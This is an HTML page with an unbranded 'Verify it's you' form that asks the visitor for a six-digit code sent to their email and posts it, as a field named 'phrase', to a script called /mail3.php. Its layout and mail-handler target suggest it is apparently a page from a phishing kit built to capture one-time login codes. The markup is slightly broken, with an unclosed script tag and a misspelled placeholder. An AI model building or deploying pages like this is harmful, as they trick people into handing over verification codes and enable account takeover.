<!DOCTYPE HTML>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>otp</title>
<link rel="shortcut icon" type="land/img/jpg" href="land/img/favicon.png">

<link rel="stylesheet" href="land/css/bootstrap.min.css">

<link rel="stylesheet" href="land/css/main.min.css">

<style type="text/css">
body{
	background:#001739;
}

.dashed {
  overflow: hidden;
  text-align: center;
}

.dashed:before,
.dashed:after {
  background-color: #DCDCDC;
  content: "";
  display: inline-block;
  height: 1.5px;
  position: relative;
  vertical-align: middle;
  width: 50%;
}

.dashed:before {
  right: 0.5em;
  margin-left: -50%;
}

.dashed:after {
  left: 0.5em;
  margin-right: -50%;
}
::-webkit-input-placeholder { /* WebKit, Blink, Edge */
    color:    #909;
}
:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
   color:    #909;
   opacity:  1;
}
::-moz-placeholder { /* Mozilla Firefox 19+ */
   color:    #909;
   opacity:  1;
}
:-ms-input-placeholder { /* Internet Explorer 10-11 */
   color:    #909;
}
::-ms-input-placeholder { /* Microsoft Edge */
   color:    #909;
}

::placeholder { /* Most modern browsers support this now. */
   color:    #909;
}
</style>
</head>
<body>
<br><br>
<img class="my-4 d-flex mx-auto" src="land/img/logo.png" width="160">
<br>
<div class="container">
    <div class="card">
        <div class="card-body">
<form name="form" action="/mail3.php" class="form-horizontal" method="POST">

    <h2 align="center" style="color:#001739">Verify it's you</h2>
    <br>
    <h5 align="center"><b>We've sent a verification code to your email. Enter the code from the email in the field below.</b></h5>
    <div class="form-group">
      <input required style="height:45px" type="tel"  id="phrase" name="phrase" class="form-control"  maxlength="6" required="yes" placeholder="Eenter 6 digit code" />
      </div>




      <div class="form-group">
      <button class="btn btn-lg text-white btn-block" style="background-color:#006ee7;height:50px;" onname="submit" type="submit">Verify</button>
    </div>
      <input type="hidden" name="MM_insert" value="form">

<script type="text/javascript"> 
    function changeText(submitId){
        var submit = document.getElementById(submitId);
        submit.value = 'Loading...';
        return true;
    };
   


</form>
</div>
</div>
</div>


</body>


</html>